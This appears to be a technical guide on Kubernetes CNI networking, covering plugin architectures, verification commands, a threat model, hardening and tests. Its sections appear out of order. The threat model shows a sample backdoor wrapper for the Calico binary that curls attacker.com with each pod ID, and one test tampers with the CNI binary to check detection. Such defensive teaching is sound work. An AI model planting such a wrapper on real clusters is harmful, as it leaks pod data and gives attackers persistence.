│  │  ├─ cali0987654321 → 10.244.1.6 (pod-2)                  │   │
│  │  └─ caliabcdef1234 → 10.244.1.7 (pod-3)                  │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
│  Pod Network Namespaces:                                        │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  Pod 1 netns (cni-12345678)                             │    │
│  │  ┌────────────────────────────────────────────────────┐ │    │
│  │  │  lo: 127.0.0.1                                     │ │    │
│  │  │  eth0: 10.244.1.5/32                               │ │    │
│  │  │    MAC: aa:bb:cc:dd:ee:ff                          │ │    │
│  │  │    Peer: cali1234567890 (on host)                  │ │    │
│  │  │    Default route: 169.254.1.1 dev eth0             │ │    │
│  │  └────────────────────────────────────────────────────┘ │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  Pod 2 netns (cni-87654321)                             │    │
│  │  eth0: 10.244.1.6/32                                    │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  Pod 3 netns (cni-abcdef12)                             │    │
│  │  eth0: 10.244.1.7/32                                    │    │
│  └─────────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────────┘
```

---

## CNI Plugin Installation Verification

```bash
# 1. Check which nodes have CNI DaemonSet pods
kubectl get pods -n kube-system -o wide | grep -E 'calico|flannel|cilium'
# calico-node-abc   2/2   Running   worker-1
# calico-node-def   2/2   Running   worker-2
# calico-node-ghi   2/2   Running   worker-3

# 2. Verify CNI binaries on node
ssh worker-1
ls -lh /opt/cni/bin/
# -rwxr-xr-x 1 root root 38M calico
# -rwxr-xr-x 1 root root 3.8M calico-ipam
# ...

# 3. Check CNI configuration
cat /etc/cni/net.d/10-calico.conflist
# Shows JSON config

# 4. Verify kubelet is using this CNI
ps aux | grep kubelet | grep cni
# --network-plugin=cni
# --cni-conf-dir=/etc/cni/net.d
# --cni-bin-dir=/opt/cni/bin

# 5. Test CNI plugin manually (requires pod info)
# Create test network namespace
sudo ip netns add test-netns

# Call CNI plugin directly
echo '{
  "cniVersion": "0.3.1",
  "name": "test-network",
  "type": "bridge",
  "bridge": "cni0",
  "ipam": {
    "type": "host-local",
    "subnet": "10.22.0.0/16"
  }
}' | sudo CNI_COMMAND=ADD \
  CNI_CONTAINERID=test123 \
  CNI_NETNS=/var/run/netns/test-netns \
  CNI_IFNAME=eth0 \
  CNI_PATH=/opt/cni/bin \
  /opt/cni/bin/bridge

# Output: JSON with allocated IP
# {
#   "cniVersion": "0.3.1",
#   "ips": [{"address": "10.22.0.2/16"}],
#   ...
# }

# Verify interface created
sudo ip netns exec test-netns ip addr show eth0
# eth0: 10.22.0.2/16

# Cleanup
echo '{}' | sudo CNI_COMMAND=DEL \
  CNI_CONTAINERID=test123 \
  CNI_NETNS=/var/run/netns/test-netns \
  CNI_IFNAME=eth0 \
  CNI_PATH=/opt/cni/bin \
  /opt/cni/bin/bridge

sudo ip netns del test-netns

# 6. Check CNI IPAM allocations
# For Calico
kubectl get ippools -o yaml
kubectl get ipamblocks -o yaml

# 7. Verify pod networking
kubectl run test-pod --image=nginx
POD_IP=$(kubectl get pod test-pod -o jsonpath='{.status.podIP}')
kubectl exec test-pod -- ip addr show eth0
# eth0: inet 10.244.1.5/32

# 8. Trace CNI call in kubelet logs
sudo journalctl -u kubelet -f | grep CNI
# Invoking CNI plugin calico for pod test-pod
# CNI plugin returned: {"cniVersion":"0.3.1","ips":[...]}

# 9. Check veth pair on host
# Find pod's container ID
CONTAINER_ID=$(kubectl get pod test-pod -o jsonpath='{.status.containerStatuses[0].containerID}' | sed 's/containerd:\/\///')
CONTAINER_ID_SHORT=$(echo $CONTAINER_ID | cut -c1-15)

# Find corresponding veth interface
ip link | grep $CONTAINER_ID_SHORT
# 15: cali1234567890@if4: <BROADCAST,MULTICAST,UP>

# 10. Verify routing to pod
ip route | grep 10.244.1.5
# 10.244.1.5 dev cali1234567890 scope link
```

---

## Different CNI Plugin Architectures

### 1. Calico (BGP or VXLAN Overlay)

```
┌─────────────────────────────────────────────────────────────────┐
│  CALICO ARCHITECTURE                                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Control Plane:                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  calico-kube-controllers (Deployment, 1 replica)         │   │
│  │  • Watches Kubernetes resources (NetworkPolicy, Pods)    │   │
│  │  • Translates to Calico resources (CRDs)                 │   │
│  │  • No data plane involvement                             │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
│  Data Plane (EVERY node):                                       │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  calico-node (DaemonSet)                                 │   │
│  │  ┌────────────────────────────────────────────────────┐  │   │
│  │  │  BIRD (BGP daemon)                                 │  │   │
│  │  │  • Advertises pod CIDRs to other nodes            │  │   │
│  │  │  • Learns routes from peers                       │  │   │
│  │  │  • Updates kernel routing table                   │  │   │
│  │  └────────────────────────────────────────────────────┘  │   │
│  │  ┌────────────────────────────────────────────────────┐  │   │
│  │  │  Felix (policy agent)                              │  │   │
│  │  │  • Programs iptables rules for NetworkPolicy      │  │   │
│  │  │  • OR programs eBPF programs (if eBPF mode)       │  │   │
│  │  │  • Manages host routes                            │  │   │
│  │  └────────────────────────────────────────────────────┘  │   │
│  │  ┌────────────────────────────────────────────────────┐  │   │
│  │  │  CNI plugin binary (/opt/cni/bin/calico)          │  │   │
│  │  │  • Called by kubelet for pod ADD/DEL              │  │   │
│  │  │  • Creates veth pairs                             │  │   │
│  │  │  • Configures pod interface                       │  │   │
│  │  └────────────────────────────────────────────────────┘  │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
│  Packet Flow (BGP mode):                                        │
│  Pod A (10.244.1.5 on node-1) → Pod B (10.244.2.8 on node-2)   │
│  1. Pod A sends to 10.244.2.8                                  │
│  2. Hits default route: 169.254.1.1 via eth0                   │
│  3. Exits pod netns via veth → host netns                      │
│  4. Host routing table: 10.244.2.0/24 via 192.168.1.11 (node-2)│
│  5. Packet sent to node-2 via node network (no encap!)         │
│  6. node-2 receives, routes to cali0987654321 → Pod B          │
│                                                                 │
│  Advantages: No encapsulation overhead, native routing          │
│  Disadvantages: Requires BGP support, L3 network               │
└─────────────────────────────────────────────────────────────────┘
```

### 2. Flannel (VXLAN Overlay)

```
┌─────────────────────────────────────────────────────────────────┐
│  FLANNEL ARCHITECTURE                                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Data Plane ONLY (no separate control plane):                   │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  kube-flannel (DaemonSet, EVERY node)                    │   │
│  │  ┌────────────────────────────────────────────────────┐  │   │
│  │  │  flanneld daemon                                   │  │   │
│  │  │  • Reads cluster config from Kubernetes ConfigMap │  │   │
│  │  │  • Allocates subnet for this node (e.g. 10.244.1.0/24)│ │
│  │  │  • Creates VXLAN device (flannel.1)               │  │   │
│  │  │  • Watches Kubernetes nodes                       │  │   │
│  │  │  • Updates VXLAN FDB (forwarding database)        │  │   │
│  │  └────────────────────────────────────────────────────┘  │   │
│  │  ┌────────────────────────────────────────────────────┐  │   │
│  │  │  CNI plugin binary (/opt/cni/bin/flannel)         │  │   │
│  │  │  • Delegates to bridge plugin                     │  │   │
│  │  │  • Configures cni0 bridge                         │  │   │
│  │  └────────────────────────────────────────────────────┘  │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
│  Packet Flow (VXLAN mode):                                      │
│  Pod A (10.244.1.5 on node-1) → Pod B (10.244.2.8 on node-2)   │
│  1. Pod A sends to 10.244.2.8                                  │
│  2. Hits cni0 bridge                                           │
│  3. Bridge routes to flannel.1 VXLAN device                    │
│  4. VXLAN encapsulation:                                       │
│     Outer header: 192.168.1.10 → 192.168.1.11 (UDP 8472)      │
│     Inner header: 10.244.1.5 → 10.244.2.8                      │
│  5. Packet sent over node network                              │
│  6. node-2 decapsulates, routes to cni0 → Pod B               │
│                                                                 │
│  Advantages: Works on any network (L2/L3), simple              │
│  Disadvantages: Encapsulation overhead (~50 bytes), no NetworkPolicy│
└─────────────────────────────────────────────────────────────────┘
```

### 3. Cilium (eBPF-based)

```
┌─────────────────────────────────────────────────────────────────┐
│  CILIUM ARCHITECTURE                                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Control Plane:                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  cilium-operator (Deployment)                            │   │
│  │  • IPAM (IP allocation)                                  │   │
│  │  • CRD management (CiliumNetworkPolicy, etc.)           │   │
│  │  • Service mesh coordination                             │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
│  Data Plane (EVERY node):                                       │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  cilium-agent (DaemonSet)                                │   │
│  │  ┌────────────────────────────────────────────────────┐  │   │
│  │  │  Cilium Daemon                                     │  │   │
│  │  │  • Compiles eBPF programs (C → bytecode)           │  │   │
│  │  │  • Loads eBPF programs into kernel                │  │   │
│  │  │  • Updates eBPF maps (IP → identity mapping)      │  │   │
│  │  └────────────────────────────────────────────────────┘  │   │
│  │  ┌────────────────────────────────────────────────────┐  │   │
│  │  │  eBPF programs (kernel space)                      │  │   │
│  │  │  • Attached to veth interfaces (tc ingress/egress)│  │   │
│  │  │  • Policy enforcement (identity-based, not IP)    │  │   │
│  │  │  • Service load balancing (replaces kube-proxy)   │  │   │
│  │  │  • Connection tracking                            │  │   │
│  │  │  • L7 (HTTP/gRPC) filtering                       │  │   │
│  │  └────────────────────────────────────────────────────┘  │   │
│  │  ┌────────────────────────────────────────────────────┐  │   │
│  │  │  CNI plugin binary (/opt/cni/bin/cilium)          │  │   │
│  │  │  • Creates veth pairs                             │  │   │
│  │  │  • Attaches eBPF programs to interfaces           │  │   │
│  │  └────────────────────────────────────────────────────┘  │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
│  Advantages: High performance (kernel bypass), L7 policy,       │
│              No iptables overhead, observability                │
│  Disadvantages: Requires modern kernel (5.4+), complexity       │
└─────────────────────────────────────────────────────────────────┘
```

---

## Security Implications

### Threat Model: CNI Plugin Compromise

```
┌─────────────────────────────────────────────────────────────────┐
│  SCENARIO: Attacker compromises CNI DaemonSet pod               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Direct Access:                                                 │
│  ✅ Host network namespace (hostNetwork: true)                  │
│     • Can sniff ALL traffic on node                            │
│     • Can ARP spoof, DNS poison                                │
│  ✅ Host PID namespace (hostPID: true)                          │
│     • Can see all processes on node                            │
│     • Can ptrace into other containers                         │
│  ✅ Privileged container                                        │
│     • CAP_NET_ADMIN, CAP_SYS_ADMIN, CAP_NET_RAW               │
│     • Can load kernel modules                                  │
│     • Can modify iptables rules                                │
│  ✅ /opt/cni/bin, /etc/cni/net.d (hostPath mounts)             │
│     • Can replace CNI binaries with backdoors                  │
│     • Future pods will execute malicious CNI code              │
│  ✅ Access to all pod network namespaces                        │
│     • Can exec into any pod's netns                            │
│     • Can intercept/modify pod traffic                         │
│                                                                 │
│  Attack Examples:                                               │
│  1. Traffic Interception:                                      │
│     • Add iptables rule to TLOG all pod traffic                │
│     • Send copy to attacker-controlled endpoint                │
│                                                                 │
│  2. Network Policy Bypass:                                     │
│     • Flush iptables rules created by CNI                      │
│     • All NetworkPolicy enforcement disabled                   │
│                                                                 │
│  3. Pod IP Hijacking:                                          │
│     • Allocate same IP to attacker pod                         │
│     • Intercept traffic meant for victim pod                   │
│                                                                 │
│  4. Persistent Backdoor:                                       │
│     • Replace /opt/cni/bin/calico with wrapper:                │
│       #!/bin/bash                                              │
│       /opt/cni/bin/calico.orig "$@"                            │
│       curl attacker.com?pod=$CNI_CONTAINERID                   │
│     • Every new pod reports to attacker                        │
│                                                                 │
│  5. Lateral Movement:                                          │
│     • Use host network to access node's kubelet (10250)        │
│     • Use node credentials to access API server                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Mitigation Strategies

```bash
# 1. Restrict CNI DaemonSet RBAC
# CNI should only need to:
# - Read/update pod IPs (minimal)
# - Create/update custom resources (IPPool, etc.)

cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: ServiceAccount
metadata:
  name: calico-node
  namespace: kube-system
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: calico-node
rules:
# Minimal permissions
- apiGroups: [""]
  resources: ["pods", "nodes", "namespaces"]
  verbs: ["get", "list", "watch"]
- apiGroups: [""]
  resources: ["pods/status"]
  verbs: ["patch", "update"]
- apiGroups: ["crd.projectcalico.org"]
  resources: ["*"]
  verbs: ["*"]
# NO cluster-admin, NO secrets access, NO pod create
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: calico-node
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: calico-node
subjects:
- kind: ServiceAccount
  name: calico-node
  namespace: kube-system
EOF

# 2. Use admission controller to prevent CNI replacement
cat <<EOF | kubectl apply -f -
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: protect-cni
webhooks:
- name: validate-cni-daemonset.example.com
  rules:
  - operations: ["UPDATE", "DELETE"]
    apiGroups: ["apps"]
    apiVersions: ["v1"]
    resources: ["daemonsets"]
    scope: "Namespaced"
  namespaceSelector:
    matchLabels:
      name: kube-system
  objectSelector:
    matchLabels:
      k8s-app: calico-node
  clientConfig:
    service:
      name: webhook-service
      namespace: security
      path: "/validate-cni"
  admissionReviewVersions: ["v1"]
  sideEffects: None
  failurePolicy: Fail  # Prevent unauthorized changes
EOF

# 3. File integrity monitoring on CNI binaries
# Install AIDE or Falco
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-rules
  namespace: falco
data:
  custom-rules.yaml: |
    - rule: CNI Binary Modified
      desc: Detect modification of CNI plugin binaries
      condition: >
        open_write and
        fd.name startswith /opt/cni/bin/
      output: >
        CNI binary modified (user=%user.name command=%proc.cmdline file=%fd.name)
      priority: CRITICAL
      tags: [filesystem, cni]
    
    - rule: CNI Config Modified
      desc: Detect modification of CNI configuration
      condition: >
        open_write and
        fd.name startswith /etc/cni/net.d/
      output: >
        CNI config modified (user=%user.name file=%fd.name)
      priority: WARNING
      tags: [filesystem, cni]
EOF

# 4. Read-only host mounts where possible
# Modify CNI DaemonSet to mount /opt/cni/bin read-only after install
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: calico-node
spec:
  template:
    spec:
      initContainers:
      - name: install-cni
        volumeMounts:
        - name: cni-bin-dir
          mountPath: /host/opt/cni/bin
          # Read-write during install
      containers:
      - name: calico-node
        volumeMounts:
        - name: cni-bin-dir
          mountPath: /opt/cni/bin
          readOnly: true  # Read-only in main container

# 5. Use seccomp to restrict CNI syscalls
# Even though privileged, limit unnecessary syscalls
apiVersion: v1
kind: Pod
metadata:
  name: calico-node
spec:
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: cni-restricted.json

# /var/lib/kubelet/seccomp/cni-restricted.json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {"names": ["read", "write", "open", "close", "socket", "bind", "connect"], "action": "SCMP_ACT_ALLOW"},
    {"names": ["ioctl"], "action": "SCMP_ACT_ALLOW", "args": [{"index": 1, "value": "SIOCADDRT"}]},
    # Allow only network-related syscalls
  ]
}

# 6. Separate CNI control plane from data plane
# Use a centralized IPAM service instead of node-local allocation
# Reduces blast radius if node CNI is compromised

# 7. Audit CNI API calls
# Enable audit logging for CNI-related operations
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
- level: RequestResponse
  resources:
  - group: "crd.projectcalico.org"
    resources: ["ippools", "ipamblocks"]
  - group: ""
    resources: ["pods"]
    verbs: ["patch"]
    # Log all CNI IP allocations

# 8. Network segmentation for CNI pods
# Use NetworkPolicy to restrict CNI pod egress
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: restrict-cni-egress
  namespace: kube-system
spec:
  podSelector:
    matchLabels:
      k8s-app: calico-node
  policyTypes:
  - Egress
  egress:
  # Only allow DNS and API server
  - to:
    - namespaceSelector:
        matchLabels:
          name: kube-system
    ports:
    - protocol: TCP
      port: 6443  # API server
  - ports:
    - protocol: UDP
      port: 53  # DNS
```

---

## Testing & Validation

```bash
# 1. Verify CNI installation on all nodes
kubectl get nodes
for NODE in $(kubectl get nodes -o jsonpath='{.items[*].metadata.name}'); do
  echo "=== Node: $NODE ==="
  kubectl debug node/$NODE -it --image=ubuntu -- chroot /host bash -c "ls /opt/cni/bin/"
done

# 2. Test CNI plugin isolation
# Create pod on specific node
kubectl run test-pod --image=nginx --overrides='{"spec":{"nodeName":"worker-1"}}'

# Check veth interface created
kubectl debug node/worker-1 -it --image=ubuntu -- chroot /host bash -c "ip link | grep cali"

# Verify pod IP allocated from node CIDR
kubectl get pod test-pod -o jsonpath='{.status.podIP}'
# Should be in 10.244.1.x range (node-1's CIDR)

# 3. Test CNI plugin failure handling
# Stop CNI DaemonSet pod on node-1
kubectl delete pod -n kube-system -l k8s-app=calico-node --field-selector spec.nodeName=worker-1

# Try to create pod on node-1 (should fail)
kubectl run test-fail --image=nginx --overrides='{"spec":{"nodeName":"worker-1"}}'

kubectl get pod test-fail
# STATUS: ContainerCreating (stuck)

kubectl describe pod test-fail | grep -A 5 Events
# Failed to create pod sandbox: rpc error: failed to setup network

# Restart CNI pod
kubectl rollout restart ds -n kube-system calico-node

# Pod should eventually start

# 4. Test NetworkPolicy enforcement (requires CNI support)
kubectl run web --image=nginx --labels=app=web
kubectl expose pod web --port=80

kubectl run client --image=busybox --rm -it -- wget -O- http://web
# Should succeed (no policy)

# Apply deny-all policy
cat <<EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
spec:
  podSelector:
    matchLabels:
      app: web
  policyTypes:
  - Ingress
EOF

kubectl run client --image=busybox --rm -it -- wget -O- --timeout=5 http://web
# Should timeout (blocked by policy)

# Check iptables rules on node (CNI creates these)
kubectl debug node/worker-1 -it --image=ubuntu -- chroot /host bash -c \
  "iptables-save | grep cali-fw"

# 5. Benchmark CNI overhead
# Without CNI (host network)
kubectl run perf-host --image=networkstatic/iperf3 --restart=Never \
  --overrides='{"spec":{"hostNetwork":true}}' -- -s

kubectl run perf-client-host --image=networkstatic/iperf3 --rm -it \
  --overrides='{"spec":{"hostNetwork":true}}' -- -c <node-ip> -t 10

# With CNI (pod network)
kubectl run perf-cni --image=networkstatic/iperf3 --restart=Never -- -s
kubectl run perf-client-cni --image=networkstatic/iperf3 --rm -it -- -c <pod-ip> -t 10

# Compare throughput (expect 5-15% overhead for VXLAN, <5% for BGP)

# 6. Test CNI IPAM exhaustion
# Find node's pod CIDR
kubectl get node worker-1 -o jsonpath='{.spec.podCIDR}'
# 10.244.1.0/24 (254 usable IPs)

# Create 254 pods (exhaust IPAM)
kubectl create deployment exhaust --image=pause --replicas=254

kubectl get pods -o wide | grep worker-1 | wc -l
# Should see ~110 pods (kubelet max pods limit hit first)

# Try to create more pods on this node (should fail to schedule)

# 7. Verify CNI cleanup on pod deletion
POD_IP=$(kubectl get pod test-pod -o jsonpath='{.status.podIP}')
kubectl debug node/worker-1 -it --image=ubuntu -- chroot /host bash -c "ip route | grep $POD_IP"
# Should show route to pod

kubectl delete pod test-pod
sleep 5

kubectl debug node/worker-1 -it --image=ubuntu -- chroot /host bash -c "ip route | grep $POD_IP"
# Route should be removed

# 8. Test CNI binary replacement detection
# Enable Falco or AIDE
kubectl exec -n falco falco-xyz -- tail -f /var/log/falco.log &

# Try to modify CNI binary (should be detected)
kubectl debug node/worker-1 -it --image=ubuntu -- chroot /host bash -c \
  "echo '# backdoor' >> /opt/cni/bin/calico"

# Check Falco alert
# CRITICAL: CNI binary modified (file=/opt/cni/bin/calico)
```

---

## Failure Modes

| **Failure** | **Impact** | **Detection** | **Recovery** |
|-----------|----------|-------------|------------|
| **CNI DaemonSet down** | New pods stuck ContainerCreating on affected nodes | `kubectl get pods` shows ContainerCreating, describe shows CNI error | Restart DaemonSet: `kubectl rollout restart ds -n kube-system <cni-name>` |
| **CNI binary corrupted** | All new pods fail on node | Kubelet logs: "failed to find plugin", containerd logs: "exec format error" | Re-deploy CNI DaemonSet (initContainer reinstalls binaries) |
| **IPAM exhaustion** | No IPs available for new pods | Scheduler can't place pods, CNI logs: "no IPs available" | Increase pod CIDR size, or delete unused pods |
| **NetworkPolicy misconfiguration** | Legitimate traffic blocked | Pods can't communicate, timeouts | Review/fix NetworkPolicy, check iptables rules |
| **CNI config deleted** | Kubelet can't find CNI config | Kubelet logs: "no networks found in /etc/cni/net.d" | Restore config from ConfigMap, restart CNI DaemonSet |
| **Routing loop** | Pod traffic loops infinitely | High CPU on nodes, pods unreachable | Check routing tables, BGP advertisements, fix CNI config |

---

## Next 3 Steps

1. **Deploy and analyze multiple CNI plugins**: Install Calico (BGP mode), Cilium (eBPF), and Flannel (VXLAN) in separate test clusters. Benchmark packet latency (with netperf/iperf3), measure NetworkPolicy enforcement overhead, trace packet path with tcpdump/bpftrace. Compare iptables rule count (Calico vs Cilium), analyze kernel bypass benefits of eBPF.

2. **Build custom CNI plugin**: Implement minimal CNI plugin in Go that creates veth pairs, assigns IPs from static pool, configures basic routing. Follow CNI spec (ADD/DEL/CHECK/VERSION commands), handle IPAM via host-local plugin. Deploy to test cluster, verify pods get IPs, test failure handling (concurrent ADD calls, IPAM conflicts). Add observability (metrics, structured logging).

3. **Implement CNI security hardening and monitoring**: Deploy Falco with custom rules to detect CNI binary/config tampering, unauthorized iptables modifications, suspicious netns operations. Build admission webhook that validates CNI DaemonSet changes (prevents image replacement, RBAC escalation). Create script that continuously audits CNI IPAM state vs actual pod IPs (detect IP hijacking). Test CNI compromise scenarios: replace binaries, inject iptables rules, verify detection and alerting.

---

## References

- **CNI Specification**: https://github.com/containernetworking/cni/blob/main/SPEC.md
- **Kubernetes Network Model**: https://kubernetes.io/docs/concepts/cluster-administration/networking/
- **Calico Architecture**: https://docs.tigera.io/calico/latest/reference/architecture/overview
- **Cilium Architecture**: https://docs.cilium.io/en/stable/overview/intro/
- **CNI Plugins**: https://github.com/containernetworking/plugins
- **Network Policies**: https://kubernetes.io/docs/concepts/services-networking/network-policies/

## Summary

Container runtimes (containerd/CRI-O/Docker) do **NOT** implement networking directly—they delegate to **CNI plugins** via a standardized exec interface. When Kubernetes kubelet calls the runtime to create a pod, the runtime creates network namespaces then **shells out** to CNI binaries in `/opt/cni/bin/` with JSON config on stdin. CNI plugins (running as separate processes, NOT as daemons initially) set up veth pairs, IP allocation, and routing, then exit with results on stdout. The **control plane** (API server, CNI controllers) manages desired network state; the **data plane** (kubelet → CRI → containerd → CNI binary execution → kernel networking) implements actual packet forwarding. Docker uses its own libnetwork but can be shimmed to CNI via dockershim (deprecated). This loose coupling means runtime compromise doesn't automatically give network control—you must separately compromise CNI binaries or their execution environment.

---

## Architecture: Layered Networking Stack

```
┌─────────────────────────────────────────────────────────────────┐
│                    KUBERNETES CONTROL PLANE                     │
│  (Decides WHAT networking should exist, not HOW)                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  kube-apiserver                                          │   │
│  │  • Stores pod specs (IP requirements, network mode)      │   │
│  │  • Stores NetworkPolicy objects                          │   │
│  │  • Stores Service objects (ClusterIP, endpoints)         │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  CNI Controller (e.g., calico-kube-controllers)         │   │
│  │  • Watches Kubernetes resources                          │   │
│  │  • Translates to CNI-specific CRDs (IPPool, etc.)       │   │
│  │  • Does NOT touch data plane directly                    │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
│  Control Plane = Desired State Management                       │
│  • Pod should have IP in 10.244.0.0/16                         │
│  • NetworkPolicy: deny ingress to pod X                        │
│  • Service Y should load balance to pods with label app=web    │
│                                                                 │
└─────────────────────────┬───────────────────────────────────────┘
                          │
                          │ API Watch/Update (HTTPS)
                          │
┌─────────────────────────▼───────────────────────────────────────┐
│                    KUBERNETES DATA PLANE                        │
│  (Implements actual networking, packet forwarding)              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  LAYER 1: KUBELET (Kubernetes Node Agent)               │   │
│  │  ┌────────────────────────────────────────────────────┐ │   │
│  │  │  Responsibilities:                                  │ │   │
│  │  │  • Watches API for pods assigned to this node      │ │   │
│  │  │  • Calls CRI to create pod sandbox                 │ │   │
│  │  │  • Does NOT know about CNI directly               │ │   │
│  │  │  • Relies on container runtime for networking     │ │   │
│  │  └────────────────────────────────────────────────────┘ │   │
│  └─────────────────────┬────────────────────────────────────┘   │
│                        │                                        │
│                        │ CRI gRPC Call                          │
│                        │ RunPodSandbox(config)                  │
│                        │                                        │
│  ┌─────────────────────▼────────────────────────────────────┐   │
│  │  LAYER 2: CONTAINER RUNTIME (containerd/CRI-O)          │   │
│  │  ┌────────────────────────────────────────────────────┐ │   │
│  │  │  Responsibilities:                                  │ │   │
│  │  │  • Creates network namespace (netns)              │ │   │
│  │  │  • Reads CNI config from /etc/cni/net.d/          │ │   │
│  │  │  • Discovers CNI plugins in /opt/cni/bin/         │ │   │
│  │  │  • Execs CNI plugin binary (fork + exec)          │ │   │
│  │  │  • Passes config via stdin, env vars              │ │   │
│  │  │  • Reads result from stdout                       │ │   │
│  │  │  • Does NOT implement networking itself           │ │   │
│  │  └────────────────────────────────────────────────────┘ │   │
│  └─────────────────────┬────────────────────────────────────┘   │
│                        │                                        │
│                        │ fork() + execve()                      │
│                        │ /opt/cni/bin/calico ADD                │
│                        │                                        │
│  ┌─────────────────────▼────────────────────────────────────┐   │
│  │  LAYER 3: CNI PLUGIN BINARY (short-lived process)       │   │
│  │  ┌────────────────────────────────────────────────────┐ │   │
│  │  │  Execution model:                                   │ │   │
│  │  │  1. Runtime forks and execs: /opt/cni/bin/calico  │ │   │
│  │  │  2. Plugin reads stdin (JSON config)               │ │   │
│  │  │  3. Plugin reads env vars (netns path, etc.)       │ │   │
│  │  │  4. Plugin performs network setup:                 │ │   │
│  │  │     • Allocates IP (IPAM)                          │ │   │
│  │  │     • Creates veth pair                            │ │   │
│  │  │     • Configures routes                            │ │   │
│  │  │     • Programs iptables                            │ │   │
│  │  │  5. Plugin writes result to stdout (JSON)          │ │   │
│  │  │  6. Plugin exits (process terminates)              │ │   │
│  │  │                                                     │ │   │
│  │  │  CNI binary is NOT a daemon—runs and exits!        │ │   │
│  │  └────────────────────────────────────────────────────┘ │   │
│  └─────────────────────┬────────────────────────────────────┘   │
│                        │                                        │
│                        │ Directly manipulates                   │
│                        │                                        │
│  ┌─────────────────────▼────────────────────────────────────┐   │
│  │  LAYER 4: KERNEL NETWORKING                             │   │
│  │  ┌────────────────────────────────────────────────────┐ │   │
│  │  │  • Network namespaces (netns)                      │ │   │
│  │  │  • veth pairs (virtual ethernet devices)           │ │   │
│  │  │  • Routing tables (per-netns and host)             │ │   │
│  │  │  • iptables/nftables rules                         │ │   │
│  │  │  • eBPF programs (for Cilium)                      │ │   │
│  │  │  • Bridge devices (cni0, docker0)                  │ │   │
│  │  │  • VXLAN/GRE/IPIP tunnels                          │ │   │
│  │  │  • tc (traffic control) qdisc                      │ │   │
│  │  └────────────────────────────────────────────────────┘ │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
│  Additionally: CNI DAEMON (optional, for complex CNIs)          │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  calico-node / cilium-agent (DaemonSet pod)             │   │
│  │  • Runs continuously (unlike CNI binary)                 │   │
│  │  • Programs routing (BGP, VXLAN)                         │   │
│  │  • Enforces NetworkPolicy (iptables/eBPF)               │   │
│  │  • Watches Kubernetes API                               │   │
│  │  • Updates CNI binary configuration                     │   │
│  │  • Does NOT get called directly by runtime              │   │
│  └──────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
```

---

## Container Runtime → CNI Interface Deep Dive

### containerd CNI Integration

```go
// Simplified containerd CNI integration (from containerd source)

type CNISetup struct {
    networkConfigs []NetworkConfig  // Loaded from /etc/cni/net.d/
    pluginDirs     []string         // /opt/cni/bin/
}

func (c *CNISetup) SetupNetwork(netns string, containerID string) (*Result, error) {
    // 1. Read CNI config files
    configs := c.loadConfigs("/etc/cni/net.d/")
    
    // 2. For each plugin in the config list
    for _, config := range configs.Plugins {
        // 3. Find plugin binary
        pluginPath := filepath.Join("/opt/cni/bin", config.Type)
        
        // 4. Prepare environment variables
        env := []string{
            "CNI_COMMAND=ADD",
            "CNI_CONTAINERID=" + containerID,
            "CNI_NETNS=" + netns,
            "CNI_IFNAME=eth0",
            "CNI_PATH=/opt/cni/bin",
        }
        
        // 5. Prepare stdin (JSON config)
        configJSON, _ := json.Marshal(config)
        
        // 6. Execute plugin binary
        cmd := exec.Command(pluginPath)
        cmd.Env = env
        cmd.Stdin = bytes.NewReader(configJSON)
        
        // 7. Capture stdout (result)
        output, err := cmd.Output()
        if err != nil {
            return nil, fmt.Errorf("CNI plugin failed: %v", err)
        }
        
        // 8. Parse result
        var result Result
        json.Unmarshal(output, &result)
        
        // 9. Continue to next plugin (chaining)
    }
    
    return &result, nil
}

func (c *CNISetup) TeardownNetwork(netns string, containerID string) error {
    // Same process but with CNI_COMMAND=DEL
    for _, config := range c.networkConfigs {
        env := []string{
            "CNI_COMMAND=DEL",
            "CNI_CONTAINERID=" + containerID,
